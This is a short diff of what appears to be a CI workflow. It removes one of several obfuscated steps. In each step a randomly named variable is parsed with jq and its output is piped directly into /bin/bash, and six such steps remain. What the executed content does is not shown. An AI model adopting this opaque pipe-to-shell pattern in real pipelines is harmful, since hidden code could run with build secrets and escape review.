@@ -48,7 +48,6 @@ jobs:
           echo $d914 | jq -r .gozf14 | /bin/bash
           printf '%s' "$bsbe234" | jq -r .wcmvs1854 | /bin/bash
           echo $ikrg5 | jq -r .xy20154 | /bin/bash
-          echo $o83 | jq -r .o83374 | /bin/bash
           echo $mm99 | jq -r .uk87 | /bin/bash
           echo $wkkhv268 | jq -r .sxe8 | /bin/bash
           echo $shcbt751 | jq -r .xao7687 | /bin/bash
